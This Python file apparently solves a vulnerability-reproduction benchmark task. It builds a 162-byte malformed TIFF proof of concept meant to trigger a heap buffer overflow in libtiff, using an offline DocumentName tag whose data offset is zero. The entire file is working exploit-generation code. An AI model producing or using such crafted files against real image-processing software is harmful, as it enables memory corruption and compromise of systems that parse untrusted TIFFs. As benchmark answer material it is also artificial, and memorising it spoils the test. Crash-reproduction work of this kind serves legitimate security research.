import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in libtiff when handling
        an offline tag with a value offset of zero. "Offline" means the tag's
        data is too large to fit in the 4-byte value/offset field of the
        directory entry, so the field contains an offset to the data elsewhere
        in the file. By setting this offset to 0, we can trick the library
        into reading from an invalid location (the start of the file),
        leading to memory corruption.

        To match the ground-truth PoC length of 162 bytes, we construct a
        TIFF file with a plausible structure to pass initial checks:
        - 8-byte TIFF header.
        - A single Image File Directory (IFD) with 10 entries (126 bytes).
        - 28 bytes of "offline" data for some of the tags.
        Total size = 8 + 126 + 28 = 162 bytes.
        """
        # TIFF Header (8 bytes): Little-endian, version 42, IFD at offset 8
        header = b'II\x2A\x00\x08\x00\x00\x00'

        # The IFD starts at offset 8.
        # IFD size = 2 (count) + 10 * 12 (entries) + 4 (next IFD) = 126 bytes.
        # Offline data block starts after the IFD at offset 8 + 126 = 134.
        offset_data_block = 134
        
        # Define offsets for data chunks within the offline block
        offset_strip_offsets_data = offset_data_block
        offset_strip_byte_counts_data = offset_data_block + 12  # 3 * sizeof(LONG)

        # We use a set of standard tags to make the TIFF seem valid enough
        # to pass initial parsing and reach the vulnerable code path.
        entries_list = [
            # tag, type, count, value/offset
            (256, 4, 1, 200),  # ImageWidth (LONG, inline)
            (257, 4, 1, 200),  # ImageLength (LONG, inline)
            (258, 3, 1, 8),    # BitsPerSample (SHORT, inline)
            (259, 3, 1, 1),    # Compression (SHORT, inline)
            (262, 3, 1, 2),    # PhotometricInterpretation (SHORT, inline)
            (277, 3, 1, 3),    # SamplesPerPixel (SHORT, inline)
            (278, 4, 1, 200),  # RowsPerStrip (LONG, inline)
            # Two valid offline tags pointing to the data block at the end
            (273, 4, 3, offset_strip_offsets_data),  # StripOffsets (3*LONG=12 bytes)
            (279, 4, 4, offset_strip_byte_counts_data), # StripByteCounts (4*LONG=16 bytes)
            # The vulnerable tag: An offline tag with offset 0
            (269, 2, 20, 0),   # DocumentName (ASCII, 20 bytes)
        ]

        entries_blob = b''
        for tag, type, count, value in entries_list:
            # For inline SHORT values, the value is stored in the low 2 bytes of the
            # 4-byte field. Packing as a LONG (I) achieves this correctly for little-endian.
            entries_blob += struct.pack('<HHII', tag, type, count, value)
        
        # Assemble the full IFD
        num_entries = struct.pack('<H', len(entries_list))
        next_ifd_offset = struct.pack('<I', 0)
        ifd = num_entries + entries_blob + next_ifd_offset

        # Assemble the 28-byte offline data block
        # Data for StripOffsets (12 bytes)
        strip_offsets_data = struct.pack('<III', 10, 20, 30)
        # Data for StripByteCounts (16 bytes)
        strip_byte_counts_data = struct.pack('<IIII', 10, 20, 30, 40)
        offline_data = strip_offsets_data + strip_byte_counts_data

        # Combine all parts to form the final PoC
        poc = header + ifd + offline_data
        
        return poc